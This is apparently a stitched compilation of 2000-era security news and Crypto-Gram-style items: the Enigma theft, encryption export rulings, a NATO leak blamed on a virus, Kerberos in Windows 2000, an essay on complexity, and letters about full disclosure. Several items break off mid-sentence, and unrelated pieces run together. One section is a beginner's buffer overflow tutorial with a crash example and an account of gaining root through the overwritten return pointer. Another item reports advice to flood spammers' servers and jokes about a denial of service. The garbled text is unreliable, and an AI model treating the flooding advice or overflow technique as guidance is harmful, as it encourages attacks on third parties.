      The missing Enigma machine

      "There is a possibility that a Thames Valley Police underwater search unit 
      may be used to search the lake in Bletchley Park. 

      "It could be hidden under the stairs in the mansion, there are lots of 
      places it could be." 

      Detectives think the thief could have abandoned the Enigma machine within 
      the 50-acre grounds of the estate, or in one of the 70 rooms in the 
      mansion. 

      The museum in Milton Keynes, Buckinghamshire, was raided in full view of 
      visitors during an open day on Saturday. 

      The Enigma - one of only three in the world - is worth up to 100,000 and 
      was used by the Germans to encrypt messages sent during the Second World 
      War. 

      Bletchley Park is believed to have shortened the war by cracking the code. 

      Detectives were appealing for any visitors on Saturday who took pictures 
      or video footage to contact police in the hope they might identify the 
      thief. 

      Reward offered 

      Mr Brett urged whoever stole the machine not to be tempted to destroy the 
      evidence in the light of massive publicity. 

      He added: "If it's a prank that's gone wrong, don't destroy it because our 
      main priority is getting it back." 

      A 5,000 reward is being offered by BT, owners of part of the site in 
      Milton Keynes since World War II. 

      "It is a tragedy that the machine has been stolen," Alan White, director 
      of BT's property division, said.

      Crypto Regs Challenged Again by Declan McCullagh 4:00 p.m. Apr. 4, 2000 
      PDT Privacy advocates won a preliminary victory when for the second time a 
      federal appeals court questioned restrictions on data-scrambling 
      encryption software. 

      The Sixth Circuit Court of Appeals suggested Monday that President 
      Clinton's restrictions on distributing encryption products might be 
      unconstitutional. 

      
      "Because computer source code is an expressive means for the exchange of 
      information and ideas about computer programming, we hold that it is 
      protected by the First Amendment," a three-judge panel said in a unanimous 
      17KB decision. 

      That decision reversed a July 1998 ruling by a federal district court. 

      And while the panel did not strike down the Clinton administration's 
      regulations, it did refer the matter back to U.S. District Judge James 
      Gwin for another hearing. Earlier Gwin had ruled the First Amendment did 
      not apply. 

      The Justice Department says source code is akin to instructions for a 
      machine, and rules governing its distribution are necessary for national 
      security reasons. 

      Now that the appeals court has ruled source code is protected by the First 
      Amendment, the government will have a much tougher time arguing it should 
      have the power to imprison a law professor for posting a book on his 
      website. 

      Peter Junger, a professor at Case Western University School of Law, sued 
      the federal government after it told him he needed a license to post a 
      chapter of his Computers and the Law textbook online. 

      The American Civil Liberties Union, which represents Junger, applauded the 
      ruling. 

      "This is a great day for programmers, computer scientists and all 
      Americans who believe that privacy and intellectual freedom should be free 
      from government control," said ACLU Legal Director Raymond Vasvari. 

      In a separate case that also challenges the criminal penalties the U.S. 
      government imposes for unauthorized encryption distribution, the 9th U.S. 
      Circuit Court of Appeals in May 1999 ruled that encryption source code was 
      speech protected by the First Amendment. 

      "We conclude that the challenged regulations allow the government to 
      restrain speech indefinitely with no clear criteria for review," the 9th 
      Circuit panel said in its decision in a case brought by math professor 
      Daniel Bernstein. 

      But it's not clear what happens next in either the Junger or Bernstein 
      cases. The Clinton administration relaxed the regulations in January, and 
      the move is likely to delay both lawsuits for some time. 

      In fact, the Commerce Department, which administers the regulations, says 
      that Bernstein no longer has anything to worry about. 

      "You ask for an advisory opinion in light of your concern that the new 
      regulations 'continue to interfere with Professor Bernstein's planned 
      scientific activities.' Your concerns are unfounded," a Commerce 
      Department Bureau of Export Administration official wrote to Bernstein's 
      lawyers in February. 

      Bernstein asked in March for a rehearing by the district court to take 
      into account the regulation changes.

      Daily News MasterCard Offers Virus Repair Service By Steve Gold, Newsbytes 
      April 05, 2000

      
      MasterCard has taken the unusual step of offering a free virus repair 
      service as a key feature in its small business card package.

      The card issuer has tapped Vipro Corp., for the service, which is 
      available to all MasterCard Executive BusinessCard holders.

      For those cardholders that require the service, MasterCard is offering 
      Vipro's Virus Service Plan (VSP), a normally paid-for facility, free of 
      charge to BusinessCard holder.

      Vipro's Virus Service Plan is billed as providing computer users 
      "coverage" from destructive viruses. If a virus damages a plan holder's 
      computer, Vipro will repair it at no charge to the member.

      The service, which is designed for consumers and small business owners, 
      includes a copy of Norton AntiVirus as standard, as well as online and 
      telephone technical support.

      In the event that Norton AntiVirus and/or support from a telephone tech 
      support person cannot assist the user in getting his/her PC back up and 
      running, Vipro says it has a network of more than 7,000 local repair 
      centers available across the US.

      Bernie Brenner, Vipro's president, said that small businesses are 
      extremely vulnerable to computer virus attacks. "As more businesses plug 
      into the Internet and conduct more of their day-to-day business 
      transactions online, the chance of a virus attack increases," he said.

      Newsbytes notes that the MasterCard Virus Service Plan is included free as 
      a MasterCard Executive BusinessCard benefit and includes free virus repair 
      reimbursement, Web technical support, a three-month trial of Norton 
      Antivirus, telephone technical support, and access to the online virus 
      resource center.

      Smashing the what?? 

      An introduction to the memory buffers and a explanation of their possible 
      uses as weaknesses -- by Thejian 

      Introduction 

      A survey held amongst readers of the security/vulnerability report list 
      "Bugtraq" a few months ago approximately 2/3 of the respondents thought 
      the so-called "buffer overflows" to be the dominating security problem. 
      (http://immunix.org/SlackGuard/discex00.pdf) When you troll through the 
      messages and advisories on this same list, you indeed get the impression 
      this might not be to far from the truth since the lil' boogers are 
      mentioned everywhere. In the following article I'll try to explain a bit 
      more about the way memory is handled on a system and how these buffer 
      problems can be used to exploit it. Most of the various files floating 
      around out there however require quite a background in programming etc to 
      understand, I'll try to make this understandable even for those of you who 
      do not exactly meet that requirement (maybe particularly those of you). I 
      hope to make "simplify" not "dumbify" however, but still this is just a 
      basic approach, useful as an introduction to the more technical texts by 
      individuals as dr Mudge, Elias Levy (Aleph One) and many others (see 
      bibliography). So if you were born with pure ASM running through your 
      veins you might want to look elsewhere, if however you're just the average 
      enthusiast wanting to know what all those "elite" people are talking 
      about, do read on :) 

      What are these "buffers" you keep talking about? 

      A computer program basically is a set of instructions and requests. This 
      can easiest be illustrated in form of the famous "if-then-else" loop. An 
      instruction is run, resulting in variables which decide the course of the 
      program while the follow-up instructions are ran. A buffer (in 
      programming) is an area in the memory shared by different processes on the 
      system. Basically a buffer makes it possible to make different processes 
      run simultaneously without holding each other up or to hold data in a 
      place where it can be manipulated before its moved to a file. The program 
      also needs a way to "remember" how to follow-up when the current 
      instruction is done, what to do next. This is where the "Stack" comes in. 

      The what?? 

      The Stack (or "push-down list") is a (dynamicly) growable area of the 
      memory where when a program is executed, it dumps its data (variables, 
      memory addresses etc), which gets manipulated by whatever rules and 
      algorithms are present/appliable and then continues. Then the "next to-do" 
      instruction is taken from the top of the Stack and executed. "From the 
      top" might give you the impression this process is defined by means of a 
      predestined orderly list of any kind. The way how this actually works 
      however, is that the last instruction passed on to the system to be 
      executed ends up on top of the stack, so you could say it works in a "last 
      in - first out" manner. 

      The top and bottom of the stack are defined by the Stack pointer (which 
      holds the memory address to where the top of the Stack can be found) and 
      the Base pointer (which obviously is the other one, pointing at the bottom 
      or base of the Stack). Contrary to what might seem logical, the number 
      associated with the memory addresses start at the bottom of the stack 
      (hence the "base") and start counting up. Because of this, generally 
      programs refer to the BP for the location of their data. This means the 
      start of an 10 character instruction is not called as SP + 1 but as BP -11 
      (or actually BP +11 because of the numbers counting up "backwards"). 

      The Buffer Overflow 

      As said before, a buffer is an area shared by different processes. 
      Obviously there is a need for a certain flexibility here, to allow this 
      changing of different processes to actually happen and to allow it to be 
      called from different positions in the program. These buffers are subject 
      to certain rules though and overflowing them is nothing more than the word 
      says, breaking those rules by filling up a buffer by putting more in it 
      than fits in. (think of trying to hammer the triangle into the mold of a 
      circle :) 

      An example: (part of in the bibliography mentioned doc on the writing of 
      Buffer Overflows by dr. Mudge of L0pht Heavy Industries) 

      --------syslog_test_1.c------------       #include char buffer[4028]; void 
      main() { int i; for (i=0; i<=4028; i++) buffer[i]='A'; syslog(LOG_ERR, 
      buffer); } --------end syslog_test_1.c---------- 

      
      What happens here is that the buffer, which is set to contain 4028 
      characters is filled with A's as long as the amount of A's is smaller than 
      or equals 4028. Obviously the set buffer size eventually is exceeded, 
      causing the buffer to "overflow". The system returns: 

      Program received signal 11, Segmentation fault 

      0x1273 in vsyslog (0x41414141, 0x41414141, 0x41414141, 0x41414141) 

      or pops up something like the following:[ (when in Windows) 

      "The Instruction at '0x1273' referenced memory at '0x41414141'. The memory 
      could not be read." 

      Here the second line tells us a number of things as the location where it 
      crashed. The 41's you see are the hex equivallent for the ascii character 
      'A'. 

      Gee that's nice.. but what can I do with it? 

      Most network/server systems manage a variety of different accounts to keep 
      track of which user is where doing what and to make sure no user could 
      have access to things (be it files or processes/services) he or she 
      shouldn't have. Obviously the accounts with the higher privileges are the 
      ones the most interesting because they give access to and allow 
      manipulation/execution of a lot more things. What you'd want to do is to 
      exploit an Buffer Overflow in something (program/service/etc) ran by one 
      of these accounts, allowing you to change the position indicating the 
      "next-to-do" instruction and possibly allowing you to execute your own 
      code. By overwriting this pointer with (enough of) the value you use to 
      overflow the buffer, the program is redirected to (when using the A's 
      mentioned in the above example) address 0x41414141 and executing the 
      instructions it finds there. The beauty of this all is that these 
      instructions are run with the privileges of the account which process you 
      interrupted. This way you could pop up a command prompt as root or run 
      code you wrote/uploaded on another account with the privileges of the 
      administrator. Imagine the possibilities :) So as Mudge says, "put on 
      those warp refraction eye-goggles and on we go" ! 

      The more technical side (or: Bibliography) 

      Now you have a bit of an understanding as to what buffer overflows 
      actually are and how they work, or at least so I hope. If you got the 
      taste for it now, or just want to experiment, you now might want to move

      Microsoft's Home State Cracks Down on Piracy
      Washington Governor's Order Targets Software Copying 
      April 4, 2000 
      
      By David Noack 
      
      OLYMPIA, Wash. (APBnews.com) -- Washington state, with an economy that has 
      boomed along with Microsoft's, has launched a crackdown on state employees 
      who illegally circulate pirated software on government computers. 

      Gov. Gary Locke signed an executive order Monday aimed at preventing the 
      illegal acquisition and distribution of programs using state equipment or 
      funds. 

      "We are working diligently to combat computer software piracy," Locke 
      said. "As a major purchaser and user of computer software, Washington 
      state government must set an example in acquiring and using legally 
      licensed software." 

      Washington now becomes the fourth state to issue strict policies and 
      guidelines dealing with software piracy in state government. The other 
      states are California, Nevada and Colorado. 

      The executive order 

      The executive order directs all state agencies to take the following 
      actions: 

      
      Adopt procedures to prevent the unlawful acquisition, reproduction, 
      distribution or transmission of computer software Establish procedures to 
      ensure that computer software use complies with the law Take appropriate 
      measures if contractors or financial assistance recipients use state funds 
      to acquire, operate or maintain illegal software. In addition to the 
      illegality of having pirated software, Locke also cited economic concerns 
      for issuing the order. 

      Estimates of 4,000 jobs lost 

      "Illegal software use has a very damaging impact on Washington's economy," 
      Locke said. "We cannot tolerate counterfeiters who try to make a quick 
      buck by pawning illegal software to honest consumers at the expense of 
      Washington's taxpayers." 

      Computer industry estimates show pirated software costs Washington's 
      economy almost 4,000 jobs annually and more than $200 million in lost 
      wages. 

      The state is home to more than 7,000 high-technology businesses, including 
      software developers, software training groups, and software and hardware 
      service organizations. These businesses employ more than 76,000 people and 
      pay more than $3.7 billion in annual wages. 

      Computer trade associations such as the Software Information Industry 
      Association (SIIA) and the Business Software Alliance (BSA) have long 
      argued that software piracy costs the industry billions annually and have 
      called for more software auditing. 

      Peter Beruk, vice president of anti-piracy programs at the SIIA, said that 
      an executive order dealing with software piracy sends a message to the 
      state bureaucracy that this kind of behavior won't be tolerated. 

      "It helps having a governor issuing an executive order like this," Beruk 
      said. "It puts notice on people who are responsible for this to do the 
      right thing. It gives them, the people actually responsible for doing 
      this, ... an important job. The governor has directed us to do this." 

      Officials from the Microsoft Corp. and Adobe Systems Inc. were quick to 
      applaud the governor's actions to protect intellectual property rights in 
      Washington state. 

      On the federal level, President Clinton issued a national executive order 
      against software piracy in October 1998, and other countries around the 
      globe ranging from China to Norway to Colombia have issued such 
      intellectual property directives. 

      A leadership role 

      Locke will speak about the executive order today at a meeting of the 
      Government Leaders Conference, where, in an address on "Digital 
      Government," he will highlight why the protection of intellectual property 
      is important in today's economy. 

      "We're encouraged to see Washington continue to take a state leadership 
      role in addressing the issue of intellectual property rights, as both 
      consumers and governments move into the digital era where the online world 
      becomes the norm for business transactions," said Anne Murphy, corporate 
      attorney at Microsoft. 

      The head of Washington's software industry also backed the governor's 
      efforts to protect intellectual property. 

      "Much focus over the years has been about foreign software piracy, 
      obscuring the fact that piracy is a rampant domestic issue," said Kathleen 
      Wilcox, president and chief executive officer of the Washington Software 
      Alliance. 

      Approximately 20 percent of the software used in Washington -- one out of 
      every five copies -- has been illegally copied, according to a 1998 study 
      by International Planning & Research Corp. 

      Pirate targets 

      Experts said that governments are often targets for software pirates, 
      mainly due to the low-bid government procurement processes in place. 
      Because many illegitimate software manufacturers now advertise their 
      products over the Internet -- where it is more difficult for consumers to 
      distinguish genuine from illegal software -- it has become increasingly 
      easy for customers at all levels to be deceived into believing that they 
      are acquiring genuine software. 

      "Washington state residents clearly don't want their taxpayer dollars 
      going toward pirated software or the organized crime rings that could be 
      distributing it," Microsoft's Murphy said. 

      Last month, Colorado Gov. Bill Owens issued an executive order dealing 
      with the use of legal, licensed computer software throughout the state 
      government. The order applies to all state agencies, as well as all third 
      parties doing business with the state. 

      "Government agencies are among the largest users of computer software and 
      must set a positive example by mandating the use of legal and licensed 
      software," said Becca Gould, the Business Software Alliance's vice 
      president of public policy. 

      According to the Business Software Alliance, the use of illegal software 
      costs nearly $11 billion annually -- $2.8 billion in the United States 
      alone. In 1998, proliferation of illegal software in the United States 
      resulted in the loss of 109,000 jobs, $4.5 billion in wages and nearly 
      $991 million in tax revenue. 

      According to a recent industry study, the piracy rate in Colorado is 27 
      percent, resulting in lost jobs and tax revenues throughout the state.

      Daily News Virus Blows a Hole in NATO's Security By Steve Gold, Newsbytes 
      April 04, 2000

      
      The North Atlantic Treaty Organization (NATO) has launched a full-scale 
      investigation into how one of its top-secret documents ended up posted on 
      the Internet.

      The Sunday Telegraph reports that an unknown virus is to blame for the 
      posting of the nine-page document, detailing the alliance's rules of 
      engagement in the southern Yugoslav province of Kosovo, on to the Net.

      Press reports this morning say that NATO moved into full swing over the 
      weekend after the British Ministry of Defence was alerted to the problem 
      late last week.

      The Sunday Telegraph said that the top secret document was spotted by a 
      London publishing house and reported to the relevant authority. BBC news 
      reports today, meanwhile, say that a virus may be to blame.

      NATO's Brussels headquarters said that a press briefing for the media is 
      expected later today. The Sunday Telegraph, meanwhile, quotes Jamie Shea, 
      a senior spokesperson for NATO, as saying that, if the investigation shows 
      that a NATO document has got into the public domain, "it will be a matter 
      of great concern to us."

      He added, "These are sensitive NATO documents. We would like to keep them 
      classified and prevent them being compromised."  

      Newsbytes' sources say that the document posted to the Net included NATO's 
      Rules of Engagement for Land Operations, which cover the circumstances 
      under which "appropriate measures, including the use of deadly force," may 
      be used.

      The Sunday Telegraph quotes an unnamed person at the London Publishing 
      company as saying that two people tried to open up a new document on a PC 
      and, instead, the NATO Kosovo document started to scroll up.

      "The next thing I knew, I was in a meeting around lunchtime when a message 
      came from reception saying, `Your guests have arrived.'"

      On returning to work, the member of staff was interviewed by two military 
      intelligence officers in plain clothes, who said words to the effect of, 
      "'This is something we are very worried about,' and started to ask 
      questions."

      Newsbytes' sources suggest that the NATO document was top secret 
      classified material, but the classification was changed to "restricted" 
      over the weekend to prevent further embarrassment.

      Sources also suggest that the document was posted to a Usenet group, but 
      was quickly deleted by a Ministry of Defence autobot, a software agent 
      that autodeletes questionable Usenet postings from the servers of 
      Usenet-enabled Internet service providers (ISPs) around the world.

      Graham Cluley, head of corporate communications with Sophos Anti- Virus, 
      was not surprised by the reports that a virus is to blame for the NATO 
      security breach.

      He pointed to worm payloads such as the infamous Melissa virus as 
      indicative of how easy it is to trigger an Internet posting without the 
      permission of the host PC operator.

      "These latest security breaches highlight that no one is immune to 
      security scares in any form," he said, adding that, if NATO can be hit by 
      a virus, "then it should serve as a salutary reminder to all of us that we 
      all need to be vigilant against computer crime and ensure the deployment 
      of quality, up-to-date anti-virus and encryption software.

      "In this particular case, NATO has suffered an embarrassment, but viruses 
      like Melissa have already shown us how it is possible for a virus to pass 
      on confidential material to thousands via just a few hops in an e-mail 
      address book," he said.

      "Perhaps more troubling though, is the fact that these viruses appear to 
      be causing much more serious harm than a virus whose payload is a playful 
      cartoon or Dr. Who quote," he added.

      Cisco tells spam victims to reply with abusive emails

      Cisco Systems is urging victims of spam to take the law into their own 
      hands and deliver their own form of vengeance to combat unwanted e-mails. 

      It claims the best way to deal with spammers is to reply with abusive 
      e-mails and to dump massive files that will clog up their servers. 

      It's the online equivalent to blowing a whistle down the phone line when 
      dealing with nuisance calls - or flicking the Vs at a motorist before 
      chasing them for five miles after they've carved you up. 

      The advice is contained in a booklet The Easy Guide to Network Security, 
      which is also published in an ungainly PDF file on Cisco's UK Web site. 

      Under the heading "Spam", it reads: "Spam is usually harmless, but it can 
      be a nuisance, taking up time and storage space. The solution is to flame 
      the perpetrators by sending them abusive messages, or to reply by dumping 
      a very large and useless file on their Web server." 

      It's not clear whether this is a corporate-wide policy or just applies to 
      the hard noses in Britain. 

      It's certainly a different approach from that pursued by British ISP, 
      BiblioTech, which goes to extreme lengths to chase spammers through the 
      courts. 

      Question is, have you received any spam from Cisco? If so, sounds like 
      they're inviting you to take action. And if you can orchestrate it with 
      other spam victims, then you could even manufacture a denial of service 
      attack.

      Serb experts hacked into Britain's top-secret military computer systems
      during the Kosovo conflict last year, the Sunday Express has learned.
      
      In response, MI5 has been put in charge of improving Britain's defences
      against cyber attack. It is understood that both sides engaged in covert
      cyber war alongside the conventional warfare and that British agents
      successfully hacked into Serb computers.
      
      Both sides tried to plant computer viruses into military systems. The Serb
      attacks focused on computers handling the messaging systems used by the
      Ministry of Defence to communicate between headquarters in the UK and
      military units in the field.
      
      The cyber strike persuaded the Government that an all-out attack on our
      computer systems could bring the country to a standstill.
      
      Working alongside MI5 are computer experts from GCHQ in Cheltenham,
      specialist army units such as the SAS, and highly experienced private
      sector consultants. The police National Crime Squad will also be involved.
      
      A source admitted: "This kind of warfare is a deadly innovation. One
      super-hacker with just a laptop and mobile phone could wreak an amazing
      amount of damage in minutes. There are so many targets for us to defend -
      but the enemy hacker just needs to pick one and succeed."The SAS has
      carried out dummy attacks on key installations such as the National Grid
      and air-traffic control. Now, as well as testing out a location's physical
      defences, they take a civilian computer specialist with them.

                Kerberos and Windows 2000
      
      
      
      Kerberos is a symmetric-key authentication scheme.  It was developed at MIT
      as part of their Project Athena in the 1980s -- the protocol was published
      in October 1988 -- and has been implemented on various flavors of
      UNIX.  The current version is Kerberos Version 5, which corrected some
      security vulnerabilities in Version 4.  It's never taken over the
      authentication world, but it is used in many networks.  These days, the
      Internet Engineering Task Force (IETF) controls the specification for Kerberos.
      
      Kerberos is a client-server authentication protocol.  (_Applied
      Cryptography_ goes into the protocol in detail.)  For the point of this
      article, remember that there is a secure Kerberos server on a
      network.  Clients log into the Kerberos server and get secure
      "tickets."  The clients can use these tickets to log onto other servers on
      the network: file servers, databases, etc.
      
      Kerberos is now part of Microsoft Windows 2000, sort of.  The issue is that
      Microsoft has made changes to the protocol to make it noninteroperable with
      the Kerberos standard, and with any products that implement Kerberos correctly.
      
      Specifically, the incompatibility has to do with something called the "data
      authorization field" in the Kerberos messages.  All major Kerberos
      implementations leave the field blank.  The new Microsoft implementation
      does not; it uses the field to exchange access privileges between the
      Kerberos server and the client.
      
      There are two ways to look at this:
      
      o   Since the field has no specific uses in the protocol (and no one else
      uses it), the fact that Microsoft is using the protocol is harmless.
      
      o   Because Microsoft is refusing to publish details about its proprietary
      use of the field, they are harming interoperability and
      standardization.  Other Kerberos vendors cannot directly support Windows
      2000 clients.
      
      Even worse, Microsoft bypassed the IETF in this process (there's a
      procedure you're supposed follow if you want to enhance, deviate from, or
      modify an IETF standard).
      
      On the surface, this is just nasty business practices.  If you're a company
      that has invested in a UNIX-based Kerberos authentication system and you
      want to support Windows 2000 desktops, your only real option is to buy a
      Windows 2000 Kerberos server and pay for the integration.  I'm sure this is
      what Microsoft wants.
      
      My worry is more about the security.  Protocols are very fragile; we've
      learned that time and time again.  You can't just make changes to a
      security protocol and assume the changed protocol will be
      secure.  Microsoft has taken the Kerberos protocol -- a published protocol
      that has gone through over a decade of peer review -- and has made changes
      in it that affect security.  Even worse, they have made those changes in
      secret and have not released the details to the world.
      
      Don't be fooled.  The Kerberos in Windows 2000 is not Kerberos.  It does
      not conform to the Kerberos standard.  It is Kerberos-like, but we don't
      know how secure it is.

      "A Performance Comparison of the Five AES Finalists"
      
      B. Schneier and D. Whiting, Third AES Candidate Conference, 2000, to appear.
      
      In 1997, NIST announced a program to develop and choose an Advanced
      Encryption Standard (AES) to replace the aging Data Encryption Standard
      (DES).  NIST chose five finalists in 1999.  We compare the performance of
      the five AES finalists on a variety of common software platforms: current
      32-bit CPUs (both large microprocessors and smaller, smart card and
      embedded microprocessors) and high-end 64-bit CPUs.  Our intent is to show
      roughly how the algorithms' speeds compare across a variety of CPUs.  Then,
      we give the maximum rounds cryptanalyzed for each of the algorithms, and
      re-examine all the performance numbers for these variants. We then compare
      the algorithms again, using the minimal secure variants as a way to more
      fairly align the security of the five algorithms.

      The big AES news is the week of 10-14 April, 2000, in New York.  Monday,
      Tuesday, and Wednesday are the 7th Fast Software Encryption workshop (FSE
      2000).  Thursday and Friday are the 3rd AES Candidate Conference
      (AES3).  Both are in the New York Hilton and Towers.  FSE 2000 will have
      several excellent papers on the AES candidates (new attacks on MARS, RC6,
      Rijndael, and Serpent), and AES3 will have nothing but.  The papers for FSE
      2000 have been selected, and are listed on the Web site.  The papers for
      AES3 have not been announced yet.  (The submission deadline for both
      conferences is long past.)

      This is a weird one.  Two people in Minneapolis who allegedly stole

      The ramifications of this are unclear.  There are some burglary tools that
      you can't carry unless you are a licensed professional (certain lockpicking

              Software Complexity and Security
      
      
      
      The future of digital systems is complexity, and complexity is the worst
      enemy of security.
      
      Digital technology has been an unending series of innovations, unintended
      consequences, and surprises, and there's no reason to believe that will
      stop anytime soon.  But there is one thing that has held constant through
      it all, and it's that digital systems have gotten more complicated.
      
      We've seen it over the past several years.  Microprocessors have gotten
      more complex.  Operating systems have gotten more complex.  Computers have
      gotten more complex.  Networks have gotten more complex.  Individual
      networks have combined, further increasing the complexity.  I've said it
      before, but it's worth repeating:  The Internet is probably the most
      complex machine mankind has ever built.  And it's not getting any simpler
      anytime soon.
      
      As a consumer, I think this complexity is great.  There are more choices,
      more options, more things I can do.  As a security professional, I think
      it's terrifying.  Complexity is the worst enemy of security.  This has been
      true since the beginning of computers, and is likely to be true for the
      foreseeable future.  And as cyberspace continues to get more complex, it
      will continue to get less secure.  There are several reasons why this is true.
      
      The first reason is the number of security bugs.  All software contains
      bugs.  And as the complexity of the software goes up, the number of bugs
      goes up.  And a percentage of these bugs will affect security.
      
      The second reason is the modularity of complex systems.  Complex systems
      are necessarily modular; there's no other way to handle the complexity than
      by breaking it up into manageable pieces.  We could never have made the
      Internet as complex and interesting as it is today without modularity.  But
      increased modularity means increased security flaws, because security often
      fails where two modules interact.
      
      We've already seen examples of this as everything becomes
      Internet-aware.  For years we knew that Internet applications like sendmail
      and rlogin had to be secure, but the recent epidemic of macro viruses shows
      that Microsoft Word and Excel need to be secure.  Java applets not only
      need to be secure for the uses they are intended, they also need to be
      secure for any other use an attacker might think of.  Photocopiers,
      maintenance ports on routers, mass storage units: these can all be made
      Internet-aware, with the associated security risks.  Rogue printer drivers
      can compromise Windows NT.  Malicious e-mail attachments can tunnel through
      firewalls.  Convenience features in Microsoft Outlook can compromise security.
      
      The third reason is the increased testing requirements for complex
      systems.  I've talked elsewhere about security and failure testing.  The
      only reasonable way to test the security of a system is to perform security
      evaluations on it.  However, the more complex the system is, the harder a
      security evaluation becomes.  A more complex system will have more
      security-related errors in the specification, design, and
      implementation.  And unfortunately, the number of errors and the difficulty
      of evaluation does not grow in step with the complexity, but in fact grows
      much faster.
      
      For the sake of simplicity, let's assume the system has ten different
      settings, each with two possible choices.  Then there are 45 different
      pairs of choices that could interact in unexpected ways, and 1024 different
      configurations altogether.  Each possible interaction can lead to a
      security weakness, and must be explicitly tested.  Now, assume that the
      system has twenty different settings.  This means 190 different pairs of
      choices, and about a million different configurations.  Thirty different
      settings means 435 different pairs and a billion different
      configurations.  Even slight increases in the complexity of systems mean an
      explosion in the number of different configurations . . . any one of which
      could hide a security weakness.
      
      The increased number of possible interactions creates more work during the
      security evaluation.  For a system with a moderate number of options,
      checking all the two-option interactions becomes a huge amount of
      work.  Checking every possible configuration is effectively
      impossible.  Thus the difficulty of performing security evaluations also
      grows very rapidly with increasing complexity.  The combination of
      additional (potential) weaknesses and a more difficult security analysis
      unavoidably results in insecure systems.
      
      The fourth reason is that the more complex a system is, the harder it is to
      understand.  There are all sorts of vulnerability points -- human-computer
      interface, system interactions -- that become much larger when you can't
      keep the entire system in your head.
      
      The fifth (and final) reason is the difficulty of analysis.  The more
      complex a system is, the harder it is to do this kind of
      analysis.  Everything is more complicated: the specification, the design,
      the implementation, the use.  And as we've seen again and again, everything
      is relevant to security analysis.
      
      A more complex system loses on all fronts.  It contains more weaknesses to
      start with, its modularity exacerbates those weaknesses, it's harder to
      test, it's harder to understand, and it's harder to analyze.
      
      It gets worse:  This increase in the number of security weaknesses
      interacts destructively with the weakest-link property of security: the
      security of the overall system is limited by the security of its weakest
      link.  Any single weakness can destroy the security of the entire system.
      
      Real systems show no signs of becoming less complex.  In fact, they are
      becoming more complex faster and faster.  Microsoft Windows is a poster
      child for this trend to complexity.  Windows 3.1, released in 1992, had 3
      million lines of code; Windows 95 has 15 million and Windows 98 has 18
      million.  The original Windows NT (also 1992) had 4 million lines of code;
      NT 4.0 (1996) has 16.5 million.  In 1998, Windows NT 5.0 was estimated to
      have 20 million lines of code; by the time it was renamed Windows 2000 (in
      1999) it had between 35 million and 60 million lines of code, depending on
      who you believe.  (As points of comparison, Solaris has held pretty stable
      at about 7 to 8 million lines of code for the last few releases, and Linux,
      even with the addition of X Windows and Apache, is still under 5 million
      lines of code.)
      
      The size of Windows 2000 is absolutely amazing, and it will have more
      security bugs than Windows NT 4.0 and Windows 98 combined.  In its defense,
      Microsoft has claimed that it spent 500 people-years to make Windows 2000
      reliable.  I only reprint this number because it will serve to illustrate
      how inadequate 500 people-years is.
      
      The networks of the future, necessarily more complex, will be less
      secure.  The technology industry is driven by demand for features, for
      options, for speed.  There are no standards for quality or security, and
      there is no liability for insecure software.  Hence, there is no economic
      incentive to create high quality.  Instead, there is an economic incentive
      to create the lowest quality the market will bear.  And unless customers
      demand higher quality and better security, this will never change.
      
      I see two alternatives.  The first is to recognize that the digital world
      will be one of ever-expanding features and options, of ever-faster product
      releases, of ever-increasing complexity, and of ever-decreasing
      security.  This is the world we have today, and we can decide to embrace it
      knowingly.
      
      The other choice is to slow down, to simplify, and to try to add
      security.  Customers won't demand this -- the issues are too complex for
      them to understand -- so a consumer advocacy group is required.  I can
      easily imagine an FDA-like organization for the Internet, but it can take a
      decade to approve a new prescription drug for sale, so this solution might
      not be economically viable.
      
      I repeat: complexity is the worst enemy of security.  Secure systems should
      be cut to the bone and made as simple as possible.  There is no substitute
      for simplicity.
      
      Unfortunately, simplicity goes against everything our digital future stands
      for.

                    Comments from Readers
      
      
      
      From: Shawn Hernan <svh@cert.org>
      Subject: Full Disclosure
      
      I was intrigued by your recent series of editorials in Crypto-Gram
      regarding full-disclosure, and especially, CERT.  I am writing to respond
      to the article.
      
      Some of your criticisms of CERT are valid, and I agree with them; but I
      wanted to point out a couple of things that you may not realize about our
      current practices.
      
      When deciding what to publish and when, we use a variety of different criteria.
      
      First, whatever we publish has to be *true* -- we go to great lengths to
      validate and verify everything we say in an advisory, and you can imagine
      some of the arguments that ensue over what is "true."
      
      Second, as a rule of thumb, our advisories are generally about very serious
      problems.  We have a formal metric that we use to attempt to put
      vulnerabilities on a linear scale of "severity" and we use that as a
      first-order estimate of the gravity of the problem, and use our experience
      as the final judge.  Generally, the problems issued in advisories are in
      the 90th percentile of this scale (internally called the "threat metric").
      
      Third, although it may have been true in the past, it has never been the
      case in my time here (about 4 years now) that our publication schedule was
      dependent on all (or even any) of the fixes being available.  We certainly
      prefer to have fixes available at publication time, but if we discover that
      a vulnerability is being exploited we will publish regardless of the
      availability of any fixes or patches.  My team (the vulnerability handling
      team) works very closely on a daily basis with the incident response team
      to understand if a vulnerability is being exploited.
      
      Given all that, I am trying to find responsible, practical ways to publish
      more information about vulnerabilities in a variety of forms.  We are a
      relatively small organization, and I'm not willing to sacrifice truth for
      expediency.
      
      
      From: Ryan Russell <ryan@securityfocus.com>
      Subject: Distributing Exploits
      
      You're still not totally consistent in what you say:
      
        >Third, I believe that it is irresponsible, and possibly
        >criminal, to distribute exploits.
      
      You've already acknowledged that that's what it takes to get action.

        >vulnerabilities, and writing research papers about them
        >benefits research; it makes us smarter at designing secure
        >systems. Distributing exploits just make us more vulnerable.
      
      You acknowledge your behavior being inconsistent with your words, which is
      neither here nor there.  It not only often takes an exploit, but it takes a
      press release sometimes.  Thievco released an "exploit" to decode Netscape
      passwords a year and a half ago.  Netscape did nothing.  RST Corp. did the
      same, with a press release.  That got Netscape's attention.

      Not true.  Were it not for him, we'd probably be looking at mystery tools
      that were being used that we didn't have the source for, and couldn't as
      easily analyze.  Mixter has combated much FUD by showing us exactly the
      type of thing that can be used, so that the reporters couldn't run off and
      tell the public that the evil hackers have superweapons the security
      experts know nothing about.
      
        >It enabled criminals and cost a lot of companies a lot of
        >money. Its existence makes networks less secure.
      
      As you say, like any tool, it enables both good and bad guys.  As you've
      pointed out, the security problem was already there, the tools just
      highlight it.
      
      Let me speak to the subtext of your rant against Mixter.  Some people think
      Mixter may deserve some punishment.  I don't, but I can see some of the
      logic.  Really, I think if anyone deserves punishment, it's the guys who
      used the tool.
      
      Did Mixter and even the attackers actually do anything in the spirit of
      full disclosure?  Yes.
      
      We've been complaining for years about the spoofing problem, and expecting
      ISPs to do filtering.  Nothing has happened.  Mixter put out his
      tool.  Some meetings to discuss DDoS happened.  No actual change to
      behavior, but there was some amount of advanced planning, which was good
      preparation.  Finally, some person (yes, criminal) put their neck on the
